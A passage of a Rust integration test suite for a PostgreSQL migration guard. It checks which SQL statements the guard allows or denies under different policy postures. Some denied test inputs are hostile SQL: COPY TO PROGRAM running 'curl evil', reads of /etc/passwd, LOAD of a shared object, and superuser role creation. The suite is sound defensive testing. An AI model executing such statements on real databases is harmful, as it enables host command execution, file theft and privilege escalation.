@@ -1,0 +1,1686 @@
+//! Guard behaviour-lock suite — PostgreSQL's line-1, driven through the engine.
+//!
+//! These scenarios drive the SQL guard THROUGH the engine's IR-lower pipeline
+//! (`render::lower::IrAuthor` / `conn::ExecutorConfig`), so they need both the engine
+//! and the vendor that owns the parser. They exercise the guard's public API and the
+//! engine's lowering together.
+//!
+//! # Why this is an integration test and not an in-`src` module
+//!
+//! An in-`src` `#[cfg(test)] mod` is how a suite reaches engine internals, and this one
+//! must not live that way: the
+//! assertions below name PostgreSQL's deny-list rule ids
+//! (`zero_migrate_postgres::guard::denylist::rule`), and
+//! `dialect_matrix/core_names_no_vendor_crate.rs` forbids ANY file under
+//! `crates/zero-migrate-core/src` from naming a vendor crate — a test asserting one
+//! vendor's rule ids is exactly the coupling that census exists to catch, whether or
+//! not it is `#[cfg(test)]`.
+//!
+//! Nothing is weakened by living here. Everything it needs from the engine
+//! (`render::lower`, `conn::ExecutorConfig`, `model::*`) is already `pub`; the only
+//! genuinely crate-private dependency is the `#[cfg(test)] pub(crate) test_fixtures`
+//! module, whose four charter builders are mirrored in `tests/support/mod.rs` - they
+//! are built from the PUBLIC `effective_policy_from_charter_toml`, so the mirror is a
+//! second CALLER of the public API rather than a second copy of engine logic.
+//!
+//! Coverage map:
+//!   - the Platform posture is carried by the composed policy and by nothing else.
+//!   - Platform widening is correct AND bounded (privileged constructs pass;
+//!     RCE/host-escape/cross-schema-to-creator still denied).
+//!   - DO-block privileged DDL applies under Platform; the RCE token-scan
+//!     stays hard even under Platform; the same blocks deny under Confined.
+//!   - the SchemaScope swap is byte-identical under Single for the
+//!     func-def-target + literal-schema-ref read sites.
+
+// Many types below are named via full `zero_migrate::…` paths (matching the original
+// in-module code); only the bare-referenced names are imported here.
+use zero_migrate::guard::{
+    check_ir_data_security_policy, data_security_rule, GuardConfig, GuardError, MigrationGuard,
+};
+use zero_migrate::model::ir::{MigrationIr, Op};
+use zero_migrate::model::policy::{DestructiveOps, SchemaScope};
+use zero_migrate::DialectId;
+use zero_migrate_mysql::DIALECT as MYSQL;
+use zero_migrate_postgres::guard::denylist::rule;
+use zero_migrate_postgres::guard::{flags_for, SqlGuard};
+use zero_migrate_postgres::DIALECT as POSTGRES;
+use zero_migrate_sqlite::DIALECT as SQLITE;
+
+/// A Platform guard over the real port allowlist (`zero_migrate` / `public`) +
+/// the two ported extensions.
+///
+/// It is built straight from a composed `EffectivePolicy`, which is where the Platform
+/// posture lives. No capability token is involved, and none ever was here: the posture
+/// is a property of the policy argument, not of anything the caller holds.
+fn platform_guard() -> SqlGuard {
+    SqlGuard::new(platform_guard_config())
+}
+
+fn platform_guard_config() -> GuardConfig {
+    platform_guard_config_with_data(false, DestructiveOps::Allow)
+}
+
+fn platform_guard_config_with_data(
+    require_rls: bool,
+    destructive_ops: DestructiveOps,
+) -> GuardConfig {
+    GuardConfig::from_policy(
+        crate::support::operator_with_data_security(
+            &["zero_migrate", "public"],
+            &["citext", "uuid-ossp"],
+            require_rls,
+            destructive_ops,
+        ),
+        POSTGRES,
+    )
+}
+
+fn confined_guard_config() -> GuardConfig {
+    GuardConfig::from_policy(crate::support::no_inject("zero_migrate"), POSTGRES)
+}
+
+fn confined_guard() -> SqlGuard {
+    SqlGuard::new(confined_guard_config())
+}
+
+fn vendor_ir(op: zero_migrate_ir::ir::Op) -> zero_migrate_ir::ir::MigrationIr {
+    zero_migrate_ir::ir::MigrationIr {
+        inverse_ops: None,
+        irreversible: None,
+        ir_version: zero_migrate_ir::ir::CURRENT_IR_VERSION,
+        name: "vendor_guard_probe".into(),
+        owner_app: "app_corpus".into(),
+        ops: vec![op],
+        flags: Default::default(),
+        depends_on: Vec::new(),
+        supersedes: Vec::new(),
+        preconditions: Vec::new(),
+        checksum: None,
+    }
+}
+
+fn ir_with(ops: Vec<Op>) -> MigrationIr {
+    MigrationIr {
+        inverse_ops: None,
+        irreversible: None,
+        ir_version: zero_migrate_ir::ir::CURRENT_IR_VERSION,
+        name: "data_security_probe".into(),
+        owner_app: "app_corpus".into(),
+        ops,
+        flags: Default::default(),
+        depends_on: Vec::new(),
+        supersedes: Vec::new(),
+        preconditions: Vec::new(),
+        checksum: None,
+    }
+}
+
+fn create_table(name: &str) -> Op {
+    Op::CreateTable {
+        attributes: zero_migrate_ir::attribute::CreateTableAttributes::new(),
+        name: name.to_string(),
+        columns: Vec::new(),
+        primary_key: None,
+        constraints: Vec::new(),
+        indexes: Vec::new(),
+
+        partition_by: None,
+
+        runtime_options: None,
+        schema: None,
+        existence_guard: None,
+    }
+}
+
+#[test]
+fn destructive_ops_forbid_denies_structured_destructive_sql_classes() {
+    let confined = SqlGuard::new(GuardConfig::from_policy(
+        crate::support::no_inject_with_data_security("public", false, DestructiveOps::Forbid),
+        POSTGRES,
+    ));
+    for sql in [
+        "DROP TABLE users",
+        "ALTER TABLE users DROP COLUMN email",
+        "ALTER TABLE users DROP CONSTRAINT users_email_key",
+        "ALTER TABLE users ALTER COLUMN age TYPE smallint",
+        "TRUNCATE users",
+        "DELETE FROM users",
+        "DROP MATERIALIZED VIEW users_mv",
+        "DROP VIEW users_view",
+    ] {
+        assert!(
+            matches!(
+                confined.check(sql),
+                Err(GuardError::DataSecurityPolicy {
+                    rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
+                    ..
+                })
+            ),
+            "expected destructive_ops=forbid to deny {sql}"
+        );
+    }
+
+    let report = confined
+        .check("DROP INDEX users_email_idx")
+        .expect("plain DROP INDEX is reversible structure");
+    assert!(
+        !report.destructive,
+        "plain DROP INDEX must not be classified as destructive SQL"
+    );
+
+    let platform = SqlGuard::new(platform_guard_config_with_data(
+        false,
+        DestructiveOps::Forbid,
+    ));
+    assert!(matches!(
+        platform.check("DROP SCHEMA public"),
+        Err(GuardError::DataSecurityPolicy {
+            rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
+            ..
+        })
+    ));
+}
+
+#[test]
+fn destructive_ops_forbid_denies_dml_holes_and_unknowns_fail_closed() {
+    let guard = SqlGuard::new(GuardConfig::from_policy(
+        crate::support::no_inject_with_data_security("public", false, DestructiveOps::Forbid),
+        POSTGRES,
+    ));
+
+    for sql in [
+        "UPDATE users SET email = NULL",
+        "DELETE FROM users",
+        "DELETE FROM users WHERE 1=1",
+        "WITH t AS (DELETE FROM users) SELECT 1",
+        "WITH t AS (UPDATE users SET x=1) SELECT 1",
+        "DELETE FROM users WHERE 't'",
+        "DELETE FROM users WHERE true::bool",
+        "DELETE FROM users WHERE 1<2",
+        "UPDATE users SET email = NULL WHERE 1=1",
+        "MERGE INTO users USING incoming ON users.id = incoming.id WHEN MATCHED THEN DELETE",
+        "WITH t AS (MERGE INTO users USING incoming ON users.id = incoming.id WHEN MATCHED THEN DELETE) SELECT 1",
+    ] {
+        assert!(
+            matches!(
+                guard.check(sql),
+                Err(GuardError::DataSecurityPolicy {
+                    rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
+                    ..
+                })
+            ),
+            "expected destructive_ops=forbid to deny destructive DML hole {sql}"
+        );
+    }
+
+    assert!(
+        matches!(
+            guard.check("DO $$ BEGIN NULL; END $$"),
+            Err(GuardError::DataSecurityPolicy {
+                rule: data_security_rule::UNCLASSIFIED_OP_DENIED_UNDER_FORBID,
+                ..
+            })
+        ),
+        "unclassified statements must be denied under destructive_ops=forbid"
+    );
+}
+
+#[test]
+fn destructive_ops_warn_allows_and_records_structured_warning() {
+    let guard = SqlGuard::new(GuardConfig::from_policy(
+        crate::support::no_inject_with_data_security("public", false, DestructiveOps::Warn),
+        POSTGRES,
+    ));
+
+    for sql in [
+        "DELETE FROM users",
+        "DROP MATERIALIZED VIEW users_mv",
+        "DROP VIEW users_view",
+        "ALTER TABLE users DROP CONSTRAINT users_email_key",
+    ] {
+        let report = guard.check(sql).expect("warn permits destructive SQL");
+
+        assert!(
+            report.advisories.iter().any(|a| {
+                a.rule == zero_migrate_backend::advisory::rule::DATA_SECURITY_DESTRUCTIVE_OPS_WARN
+            }),
+            "warn must record advisory for {sql}: {:?}",
+            report.advisories
+        );
+    }
+
+    let report = guard
+        .check("DROP INDEX users_email_idx")
+        .expect("warn permits non-destructive DROP INDEX SQL");
+    assert!(
+        !report.advisories.iter().any(|a| {
+            a.rule == zero_migrate_backend::advisory::rule::DATA_SECURITY_DESTRUCTIVE_OPS_WARN
+        }),
+        "plain DROP INDEX must not record a destructive_ops warning: {:?}",
+        report.advisories
+    );
+}
+
+#[test]
+fn destructive_ops_warn_allows_and_records_unknown_warning() {
+    let guard = SqlGuard::new(GuardConfig::from_policy(
+        crate::support::no_inject_with_data_security("public", false, DestructiveOps::Warn),
+        POSTGRES,
+    ));
+
+    let report = guard
+        .check("DO $$ BEGIN NULL; END $$")
+        .expect("warn permits unclassified SQL with an advisory");
+
+    assert!(
+        report.advisories.iter().any(|a| {
+            a.rule == zero_migrate_backend::advisory::rule::DATA_SECURITY_UNCLASSIFIED_OPS_WARN
+        }),
+        "warn must record advisory for unclassified SQL: {:?}",
+        report.advisories
+    );
+}
+
+#[test]
+fn destructive_ops_allow_is_silent_for_policy_warning() {
+    let guard = SqlGuard::new(GuardConfig::from_policy(
+        crate::support::no_inject("public"),
+        POSTGRES,
+    ));
+
+    let report = guard
+        .check("DROP TABLE users")
+        .expect("allow permits the drop");
+
+    assert!(!report.advisories.iter().any(|a| {
+        a.rule == zero_migrate_backend::advisory::rule::DATA_SECURITY_DESTRUCTIVE_OPS_WARN
+    }));
+}
+
+#[test]
+fn destructive_ops_forbid_allows_clearly_non_destructive_sql() {
+    let guard = SqlGuard::new(GuardConfig::from_policy(
+        crate::support::no_inject_with_data_security("public", false, DestructiveOps::Forbid),
+        POSTGRES,
+    ));
+
+    guard
+        .check("CREATE TABLE users(id bigint primary key)")
+        .expect("CREATE TABLE is not destructive");
+    guard
+        .check("ALTER TABLE users ADD COLUMN email text")
+        .expect("ADD COLUMN is not destructive");
+    guard
+        .check("CREATE INDEX users_email_idx ON users(email)")
+        .expect("CREATE INDEX is not destructive");
+    guard
+        .check("INSERT INTO users(id) VALUES (1)")
+        .expect("INSERT is not destructive");
+    guard
+        .check("SELECT * FROM users")
+        .expect("SELECT is not destructive");
+    guard
+        .check("INSERT INTO users SELECT * FROM incoming")
+        .expect("INSERT SELECT without a DML CTE is not destructive");
+    guard
+        .check("ALTER TABLE users ADD CONSTRAINT users_email_chk CHECK (email IS NOT NULL)")
+        .expect("ADD CONSTRAINT is not destructive");
+    guard
+        .check("COMMENT ON TABLE users IS 'creator table'")
+        .expect("COMMENT is not destructive");
+
+    let platform = SqlGuard::new(platform_guard_config_with_data(
+        false,
+        DestructiveOps::Forbid,
+    ));
+    platform
+        .check("CREATE SCHEMA IF NOT EXISTS public")
+        .expect("CREATE SCHEMA is not destructive");
+    platform
+        .check("ALTER TABLE zero_migrate.app_secrets ENABLE ROW LEVEL SECURITY")
+        .expect("ENABLE RLS is not destructive");
+}
+
+#[test]
+fn require_rls_rejects_create_table_without_same_migration_enable() {
+    let cfg = platform_guard_config_with_data(true, DestructiveOps::Allow);
+    let ir = ir_with(vec![create_table("users")]);
+
+    let err = check_ir_data_security_policy(
+        &cfg,
+        &ir,
+        zero_migrate::guard_for(zero_migrate::shipping_vendors(), &cfg).as_ref(),
+    )
+    .unwrap_err();
+
+    assert_eq!(err.op_index, 0);
+    assert!(matches!(
+        err.source,
+        GuardError::DataSecurityPolicy {
+            rule: data_security_rule::REQUIRE_RLS,
+            ..
+        }
+    ));
+}
+
+#[test]
+fn require_rls_accepts_create_table_with_same_migration_enable() {
+    let cfg = platform_guard_config_with_data(true, DestructiveOps::Allow);
+    let ir = ir_with(vec![
+        create_table("users"),
+        Op::SetRls {
+            table: "users".to_string(),
+            schema: None,
+            enabled: Some(true),
+            forced: None,
+        },
+    ]);
+
+    check_ir_data_security_policy(
+        &cfg,
+        &ir,
+        zero_migrate::guard_for(zero_migrate::shipping_vendors(), &cfg).as_ref(),
+    )
+    .expect("matching setRls satisfies require_rls");
+}
+
+#[test]
+fn require_rls_rejects_create_enable_disable_net_off() {
+    let cfg = platform_guard_config_with_data(true, DestructiveOps::Allow);
+    let ir = ir_with(vec![
+        create_table("users"),
+        Op::SetRls {
+            table: "users".to_string(),
+            schema: None,
+            enabled: Some(true),
+            forced: None,
+        },
+        Op::SetRls {
+            table: "users".to_string(),
+            schema: None,
+            enabled: Some(false),
+            forced: None,
+        },
+    ]);
+
+    let err = check_ir_data_security_policy(
+        &cfg,
+        &ir,
+        zero_migrate::guard_for(zero_migrate::shipping_vendors(), &cfg).as_ref(),
+    )
+    .unwrap_err();
+
+    assert_eq!(err.op_index, 2);
+    assert!(matches!(
+        err.source,
+        GuardError::DataSecurityPolicy {
+            rule: data_security_rule::REQUIRE_RLS,
+            ..
+        }
+    ));
+}
+
+#[test]
+fn require_rls_rejects_standalone_disable_and_no_force() {
+    let cfg = platform_guard_config_with_data(true, DestructiveOps::Allow);
+
+    for op in [
+        Op::SetRls {
+            table: "users".to_string(),
+            schema: None,
+            enabled: Some(false),
+            forced: None,
+        },
+        Op::SetRls {
+            table: "users".to_string(),
+            schema: None,
+            enabled: None,
+            forced: Some(false),
+        },
+    ] {
+        let err = check_ir_data_security_policy(
+            &cfg,
+            &ir_with(vec![op]),
+            zero_migrate::guard_for(zero_migrate::shipping_vendors(), &cfg).as_ref(),
+        )
+        .unwrap_err();
+        assert_eq!(err.op_index, 0);
+        assert!(matches!(
+            err.source,
+            GuardError::DataSecurityPolicy {
+                rule: data_security_rule::REQUIRE_RLS,
+                ..
+            }
+        ));
+    }
+}
+
+#[test]
+fn require_rls_rejects_raw_table_creation_island_fail_closed() {
+    let cfg = platform_guard_config_with_data(true, DestructiveOps::Allow);
+    let author = platform_author();
+    let op = Op::Raw {
+        sql: "CREATE TABLE zero_migrate.raw_users AS SELECT 1 AS id".into(),
+        reason: "require_rls raw table creation regression".into(),
+    };
+
+    match author.lower_guarded(
+        &vendor_ir(op),
+        &cfg,
+        &zero_migrate::render::lower::LiveSchema::default(),
+    ) {
+        Err(zero_migrate::render::lower::IrGuardedLowerError::Denied(denial)) => {
+            assert_eq!(denial.op_kind, "raw");
+            assert!(matches!(
+                denial.source,
+                GuardError::DataSecurityPolicy {
+                    rule: data_security_rule::REQUIRE_RLS,
+                    ..
+                }
+            ));
+        }
+        other => panic!("require_rls must reject raw table-creation islands; got {other:?}"),
+    }
+}
+
+/// A vendor op's authority is the charter's capability grant, so the author composes
+/// the SAME operator charter the Platform guard does. The data-security knobs the
+/// guard varies (`require_rls`, `destructive_ops`) carry no vendor capability, so the
+/// author holds them at their guard-neutral values. The guarded lower derives its
+/// confinement scope from the guard config, so nothing widens the author by hand.
+fn platform_author() -> zero_migrate::render::lower::IrAuthor {
+    zero_migrate::render::lower::IrAuthor::new(
+        zero_migrate::shipping_vendors(),
+        "zero_migrate",
+        "app_corpus",
+        &POSTGRES,
+        &crate::support::operator_with_data_security(
+            &["zero_migrate", "public"],
+            &["citext", "uuid-ossp"],
+            false,
+            DestructiveOps::Allow,
+        ),
+    )
+}
+
+fn is_denied(g: &SqlGuard, sql: &str) -> bool {
+    matches!(
+        g.check(sql),
+        Err(GuardError::Denied { .. }
+            | GuardError::CrossSchema { .. }
+            | GuardError::DataSecurityPolicy { .. })
+    )
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum GuardDecision {
+    Allow,
+    Denied(&'static str),
+    CrossSchema,
+    Parse,
+    RawRejected,
+}
+
+fn decision_of(g: &SqlGuard, sql: &str) -> GuardDecision {
+    match g.check(sql) {
+        Ok(_) => GuardDecision::Allow,
+        Err(GuardError::Denied { rule, .. }) => GuardDecision::Denied(rule),
+        Err(GuardError::DataSecurityPolicy { rule, .. }) => GuardDecision::Denied(rule),
+        Err(GuardError::NamespacePolicy { rule, .. }) => GuardDecision::Denied(rule),
+        Err(GuardError::CrossSchema { .. }) => GuardDecision::CrossSchema,
+        Err(GuardError::Parse(_)) => GuardDecision::Parse,
+        Err(GuardError::RawSqlRejected { .. }) => GuardDecision::RawRejected,
+    }
+}
+
+fn raw_body_backstop_decision(cfg: &GuardConfig, body: &str) -> GuardDecision {
+    let guard = SqlGuard::new(cfg.clone());
+    let raw = "CREATE FUNCTION public.f() RETURNS void LANGUAGE plpgsql AS $$...$$";
+    match guard.check_raw_island_body_backstop(body, raw) {
+        Ok(()) => GuardDecision::Allow,
+        Err(GuardError::Denied { rule, .. }) => GuardDecision::Denied(rule),
+        Err(GuardError::DataSecurityPolicy { rule, .. }) => GuardDecision::Denied(rule),
+        Err(GuardError::NamespacePolicy { rule, .. }) => GuardDecision::Denied(rule),
+        Err(GuardError::CrossSchema { .. }) => GuardDecision::CrossSchema,
+        Err(GuardError::Parse(_)) => GuardDecision::Parse,
+        Err(GuardError::RawSqlRejected { .. }) => GuardDecision::RawRejected,
+    }
+}
+
+/// The behaviour lock ran over THREE postures. The third was Trusted, the root/host-set
+/// belt-off mode, and every one of its expectations was `Allow` for the trivial reason
+/// that the belt did not run. That posture is gone; the two that decide anything are
+/// what is locked here.
+fn assert_profile_decisions(
+    site: &str,
+    sql: &str,
+    confined: GuardDecision,
+    platform: GuardDecision,
+) {
+    let profiles = [
+        ("confined", confined_guard(), confined),
+        ("platform", platform_guard(), platform),
+    ];
+    for (profile, guard, expected) in profiles {
+        let got = decision_of(&guard, sql);
+        assert_eq!(
+            got, expected,
+            "{site} behavior lock changed for {profile}: {sql}"
+        );
+    }
+}
+
+/// The site this locked was the belt-skip early-return itself, whose whole content
+/// was "the belt-off posture reaches none of this". The posture is gone and so is the
+/// early-return; what the two surviving postures decide about the statement it guarded
+/// is unchanged and is what the lock is now.
+#[test]
+fn m2_stage2_site_459_copy_program_behavior_lock() {
+    assert_profile_decisions(
+        "site :459 COPY … TO PROGRAM",
+        "COPY zero_migrate.t TO PROGRAM 'sh -c id'",
+        GuardDecision::Denied(rule::COPY_PROGRAM),
+        GuardDecision::Denied(rule::COPY_PROGRAM),
+    );
+}
+
+#[test]
+fn m2_stage2_site_655_create_role_behavior_lock() {
+    assert_profile_decisions(
+        "site :655 create role",
+        "CREATE ROLE zero_migrate_auth NOLOGIN",
+        GuardDecision::Denied(rule::ROLE_MANAGEMENT),
+        GuardDecision::Allow,
+    );
+}
+
+#[test]
+fn m2_stage2_site_664_alter_role_behavior_lock() {
+    assert_profile_decisions(
+        "site :664 alter role",
+        "ALTER ROLE zero_migrate_auth LOGIN",
+        GuardDecision::Denied(rule::ROLE_MANAGEMENT),
+        GuardDecision::Allow,
+    );
+}
+
+#[test]
+fn m2_stage2_site_670_role_set_and_drop_behavior_lock() {
+    for sql in [
+        "ALTER ROLE zero_migrate_app SET search_path = zero_migrate, public",
+        "DROP ROLE IF EXISTS zero_migrate_app",
+    ] {
+        assert_profile_decisions(
+            "site :670 alter role set / drop role",
+            sql,
+            GuardDecision::Denied(rule::ROLE_MANAGEMENT),
+            GuardDecision::Allow,
+        );
+    }
+}
+
+#[test]
+fn m2_stage2_site_682_grant_stmt_behavior_lock() {
+    assert_profile_decisions(
+        "site :682 grant stmt",
+        "GRANT CONNECT ON DATABASE zero_migrate TO zero_migrate_app",
+        GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
+        GuardDecision::Allow,
+    );
+}
+
+#[test]
+fn m2_stage2_site_691_grant_role_stmt_behavior_lock() {
+    assert_profile_decisions(
+        "site :691 grant role stmt",
+        "GRANT zero_migrate_app TO zero_migrate_worker",
+        GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
+        GuardDecision::Allow,
+    );
+}
+
+#[test]
+fn m2_stage2_site_700_alter_default_privileges_behavior_lock() {
+    assert_profile_decisions(
+        "site :700 alter default privileges",
+        "ALTER DEFAULT PRIVILEGES IN SCHEMA zero_migrate GRANT SELECT ON TABLES TO zero_migrate_app",
+        GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
+        GuardDecision::Allow,
+    );
+}
+
+#[test]
+fn m2_stage2_site_798_drop_stmt_behavior_lock() {
+    for sql in [
+        "DROP POLICY IF EXISTS tenant_isolation ON zero_migrate.app_secrets",
+        "DROP SCHEMA IF EXISTS public CASCADE",
+        "DROP EXTENSION IF EXISTS citext",
+    ] {
+        assert_profile_decisions(
+            "site :798 platform drop object set",
+            sql,
+            GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
+            GuardDecision::Allow,
+        );
+    }
+}
+
+#[test]
+fn m2_stage2_site_821_create_schema_behavior_lock() {
+    assert_profile_decisions(
+        "site :821 create schema",
+        "CREATE SCHEMA IF NOT EXISTS public",
+        GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
+        GuardDecision::Allow,
+    );
+}
+
+#[test]
+fn m2_stage2_site_829_create_policy_behavior_lock() {
+    assert_profile_decisions(
+        "site :829 create policy",
+        "CREATE POLICY tenant_isolation ON zero_migrate.app_secrets USING (true)",
+        GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
+        GuardDecision::Allow,
+    );
+}
+
+#[test]
+fn m2_stage2_site_836_drop_owned_behavior_lock() {
+    assert_profile_decisions(
+        "site :836 drop owned",
+        "DROP OWNED BY zero_migrate_auth",
+        GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
+        GuardDecision::Allow,
+    );
+}
+
+#[test]
+fn m2_stage2_site_900_rls_alter_table_behavior_lock() {
+    assert_profile_decisions(
+        "site :900 RLS alter table",
+        "ALTER TABLE zero_migrate.app_secrets ENABLE ROW LEVEL SECURITY",
+        GuardDecision::Denied(rule::UNSAFE_ALTER_TABLE_CMD),
+        GuardDecision::Allow,
+    );
+}
+
+#[test]
+fn m2_stage2_site_1209_body_role_needles_behavior_lock() {
+    assert_profile_decisions(
+        "site :1209 body role needles",
+        "DO $$ BEGIN PERFORM 'create role hidden'; END $$",
+        GuardDecision::Denied(rule::ROLE_MANAGEMENT),
+        GuardDecision::Allow,
+    );
+}
+
+#[test]
+fn m2_stage2_site_1209_raw_island_body_backstop_behavior_lock() {
+    let body = "BEGIN PERFORM 'not sql create role hidden'; PERFORM 'touch search_path'; END;";
+    assert_eq!(
+        raw_body_backstop_decision(&confined_guard_config(), body),
+        GuardDecision::Denied(rule::BODY_INSPECTION),
+        "Confined raw-island body backstop must deny role/search_path needles"
+    );
+    assert_eq!(
+        raw_body_backstop_decision(&platform_guard_config(), body),
+        GuardDecision::Allow,
+        "Platform is the only posture whose body-token backstop relaxes role/search_path needles"
+    );
+    // A third row asserted the same denial for the belt-off posture, and a second half
+    // drove the same body through `lower_guarded` to prove a `createFunction` under
+    // that posture ROUTED here rather than round the belt. Both are gone with the
+    // posture: `lower_guarded` calls this backstop for nobody now — every config it can
+    // be handed runs the full belt through `check` — so there is no routing left to
+    // assert, and the backstop's own two-posture decision above is the surviving
+    // subject.
+}
+
+#[test]
+fn m2_stage2_superuser_belt_sites_stay_hard_denied() {
+    for (site, sql, expected_rule) in [
+        (
+            "site :651 create role SUPERUSER",
+            r#"CREATE ROLE "evil" SUPERUSER"#,
+            rule::SUPERUSER_ROLE,
+        ),
+        (
+            "site :661 alter role SUPERUSER",
+            r#"ALTER ROLE "evil" SUPERUSER"#,
+            rule::SUPERUSER_ROLE,
+        ),
+        (
+            "site :1201 body SUPERUSER token scan",
+            r#"DO $$ BEGIN EXECUTE format('ALTER ROLE %I SUPERUSER', 'evil'); END $$"#,
+            rule::BODY_INSPECTION,
+        ),
+    ] {
+        for (profile, guard) in [
+            ("confined", confined_guard()),
+            ("platform", platform_guard()),
+        ] {
+            let got = decision_of(&guard, sql);
+            assert_eq!(
+                got,
+                GuardDecision::Denied(expected_rule),
+                "{site} must stay hard-denied under {profile}: {sql}"
+            );
+        }
+    }
+}
+
+// ---- T11: the Platform posture comes from the policy -------------------
+
+/// The Platform posture is carried by the composed `EffectivePolicy` and by nothing
+/// else, and both readers of that policy agree about it.
+///
+/// This test used to be named for capability minting and passed a capability token to
+/// a Platform-trust executor-config seam. Both are deleted:
+/// the token's mint was public, so holding one proved nothing, and the seam bound it
+/// to a discarded parameter and returned exactly what `ExecutorConfig::new` returns.
+/// The assertions never depended on the token - they read the schema scope off the
+/// composed policy - so they are unchanged here, and the name now says what they check.
+///
+/// The boundary that IS pinned is the unforgeable `EffectivePolicy`, held by the T8
+/// `compile_fail` doctests in `zero_migrate_backend::guard`.
+#[test]
+fn t11_platform_posture_is_carried_by_the_composed_policy() {
+    // The Platform posture is identified by its PDP shape: a schema allowlist scope.
+    //
+    // Each assertion below had a partner reading "Platform runs the full static
+    // belt", which distinguished Platform from the one posture
+    // that did not. That posture is gone and every config runs the belt, so the
+    // question no longer separates anything and both partners came off.
+    let gcfg =
+        GuardConfig::from_policy(crate::support::operator_no_inject("zero_migrate"), POSTGRES);
+    assert_eq!(
+        gcfg.schema_scope(),
+        Some(SchemaScope::Allowlist(vec!["zero_migrate".into()]))
+    );
+    let ecfg = zero_migrate::conn::ExecutorConfig::new(
+        "platform",
+        "zero_migrate",
+        crate::support::operator_no_inject("zero_migrate"),
+    );
+    assert_eq!(
+        ecfg.guard_config_for(&POSTGRES).schema_scope(),
+        Some(SchemaScope::Allowlist(vec!["zero_migrate".into()]))
+    );
+}
+
+// ---- Platform widening is correct AND bounded ----------------------
+
+#[test]
+fn t4_platform_allows_privileged_constructs() {
+    let g = platform_guard();
+    let allowed = [
+        // role mgmt
+        "CREATE ROLE zero_migrate_auth NOLOGIN",
+        "ALTER ROLE zero_migrate_auth SET search_path = zero_migrate, public",
+        "ALTER ROLE zero_migrate_auth RESET search_path",
+        "DROP ROLE IF EXISTS zero_migrate_auth",
+        // grant / privilege mgmt
+        "GRANT CONNECT ON DATABASE zero_migrate TO zero_migrate_auth",
+        "GRANT USAGE ON SCHEMA public TO zero_migrate_auth",
+        "REVOKE USAGE ON SCHEMA public FROM zero_migrate_auth",
+        "ALTER DEFAULT PRIVILEGES IN SCHEMA zero_migrate GRANT SELECT ON TABLES TO zero_migrate_app",
+        // schema
+        "CREATE SCHEMA IF NOT EXISTS zero_migrate AUTHORIZATION zero_migrate_auth",
+        "DROP SCHEMA IF EXISTS zero_migrate CASCADE",
+        // RLS — the four toggles
+        "ALTER TABLE zero_migrate.app_secrets ENABLE ROW LEVEL SECURITY",
+        "ALTER TABLE zero_migrate.app_secrets FORCE ROW LEVEL SECURITY",
+        "ALTER TABLE zero_migrate.app_secrets NO FORCE ROW LEVEL SECURITY",
+        "ALTER TABLE zero_migrate.app_secrets DISABLE ROW LEVEL SECURITY",
+        // policy
+        "CREATE POLICY tenant_isolation ON zero_migrate.app_secrets \
+         USING (app_id = current_setting('zero_migrate.tenant_app', true)::uuid)",
+        "DROP POLICY IF EXISTS tenant_isolation ON zero_migrate.app_secrets",
+        // extensions (allowlisted under Platform)
+        "CREATE EXTENSION citext",
+        "CREATE EXTENSION IF NOT EXISTS \"uuid-ossp\" WITH SCHEMA public",
+        "DROP EXTENSION IF EXISTS \"uuid-ossp\"",
+        // DROP OWNED BY (0025 rollback)
+        "DROP OWNED BY zero_migrate_auth",
+        // cross-schema references within the allowlist
+        "CREATE TABLE public.clients(id int primary key)",
+        "INSERT INTO public.t SELECT * FROM zero_migrate.app_secrets",
+    ];
+    for sql in allowed {
+        assert!(
+            g.check(sql).is_ok(),
+            "Platform should ALLOW but DENIED: {sql}\n  got: {:?}",
+            g.check(sql)
+        );
+    }
+}
+
+#[test]
+fn t4_platform_still_denies_rce_and_host_escape() {
+    let g = platform_guard();
+    let denied = [
+        // RCE / host escape — kept hard in BOTH profiles
+        "COPY zero_migrate.t TO PROGRAM 'sh -c \"curl evil\"'",
+        "COPY zero_migrate.t FROM '/etc/passwd'",
+        "SELECT pg_read_file('/etc/passwd')",
+        "CREATE EXTENSION dblink",
+        "CREATE EXTENSION postgres_fdw",
+        "CREATE FUNCTION zero_migrate.f() RETURNS void AS 'x' LANGUAGE plpythonu",
+        "ALTER SYSTEM SET wal_level = minimal",
+        "CREATE FUNCTION zero_migrate.g() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$",
+        "LOAD 'evil.so'",
+        // cross-schema to a NON-allowlisted (creator) schema
+        "CREATE TABLE proj_acme.steal(id int)",
+        "INSERT INTO proj_acme.t SELECT * FROM zero_migrate.app_secrets",
+    ];
+    for sql in denied {
+        assert!(
+            is_denied(&g, sql),
+            "Platform should STILL DENY but it passed: {sql}\n  got: {:?}",
+            g.check(sql)
+        );
+    }
+}
+
+// ---- DO-block privileged DDL under Platform (body widening) -----
+
+/// 0025's bootstrap shape: a DO block whose EXECUTE literals CREATE ROLE /
+/// ALTER ROLE … SET search_path / GRANT. ALLOWED under Platform (both the
+/// recursion arm and the relaxed token-scan), DENIED under Confined.
+const BOOTSTRAP_DO: &str = "DO $bootstrap$
+    BEGIN
+        EXECUTE 'CREATE ROLE zero_migrate_app NOLOGIN';
+        EXECUTE 'ALTER ROLE zero_migrate_app SET search_path = zero_migrate, public';
+        EXECUTE 'GRANT USAGE ON SCHEMA zero_migrate TO zero_migrate_app';
+    END
+    $bootstrap$;";
+
+/// A platform role bootstrap shape: a DO block with a bare (parsed) CREATE ROLE inside.
+const PLATFORM_ROLE_DO: &str = "DO $$
+    BEGIN
+        IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = 'zero_migrate_gateway') THEN
+            CREATE ROLE zero_migrate_gateway NOLOGIN;
+        END IF;
+    END
+    $$;";
+
+#[test]
+fn t4b_do_block_privileged_ddl_applies_under_platform() {
+    let g = platform_guard();
+    assert!(
+        g.check(BOOTSTRAP_DO).is_ok(),
+        "0025 bootstrap DO should pass under Platform: {:?}",
+        g.check(BOOTSTRAP_DO)
+    );
+    assert!(
